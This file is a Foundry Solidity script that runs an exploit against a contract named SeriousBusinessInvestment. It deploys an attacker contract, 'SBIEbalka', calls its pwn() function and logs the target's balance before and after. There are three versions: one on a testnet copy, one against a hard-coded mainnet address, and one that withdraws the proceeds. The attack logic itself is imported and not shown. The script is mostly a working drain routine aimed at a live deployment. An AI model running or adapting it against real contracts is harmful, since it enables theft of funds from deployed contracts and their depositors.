// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import "../src/SeriousBusinessInvestment.sol";

contract Testnet is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        SeriousBusinessInvestment sbi = new SeriousBusinessInvestment{value: 0.1 ether}();
        TestMonki testMonki = new TestMonki();
        sbi.nftContractsInitializer("gold", address(testMonki));

        SBIEbalka ebalka = new SBIEbalka{value: 0.05 ether}(sbi);
        console.log(address(sbi).balance);
        ebalka.pwn{gas: 10_000_000}();
        console.log(address(sbi).balance);

        vm.stopBroadcast();
    }
}

contract Mainnet is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        SeriousBusinessInvestment sbi = SeriousBusinessInvestment(payable(0x7Eaa26D884F3068D2746E606d6A0B10838027e61));

        SBIEbalka ebalka = new SBIEbalka{value: 0.05 ether}(sbi);
        console.log(address(sbi).balance);
        ebalka.pwn{gas: 10_000_000}();
        console.log(address(sbi).balance);

        vm.stopBroadcast();
    }
}

contract Withdraw is Script {
    function setUp() public {}
    
    function run() public {
        vm.startBroadcast();

        SBIEbalka ebalka = SBIEbalka(payable(0x06076a9952EE4EfbcE7750159e83dCc80068bA3a));
        ebalka.withdraw();

        vm.stopBroadcast();
    }

}